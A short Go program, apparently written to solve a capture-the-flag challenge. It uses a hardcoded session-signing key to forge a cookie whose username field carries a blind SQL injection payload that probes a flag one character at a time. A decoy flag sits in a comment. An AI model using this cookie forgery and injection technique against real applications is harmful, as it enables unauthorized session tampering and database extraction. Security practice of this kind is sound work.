package main

import (
	"fmt"
	//"io"
	"log"
	//"net"
	"net/http"
	//"os"
	"github.com/gorilla/sessions"
)

func main() {
	
	store := sessions.NewCookieStore([]byte("d2908c1de1cd896d90f09df7df67e1d4"))

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		session, err := store.Get(r, "session")
		// FL4GGG{Wow you found me but this is not flag} 
		session.Values["username"] = "admi' OR MID(flag,3,1)='A'--'"
		err = session.Save(r, w)
		if err != nil {
			log.Println(err)
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}
		// session, _ = store.Get(r, "session")
		fmt.Fprint(w, session.Values)
	})

	log.Println("Starting server...")
	http.ListenAndServe(":9453", nil)
	
}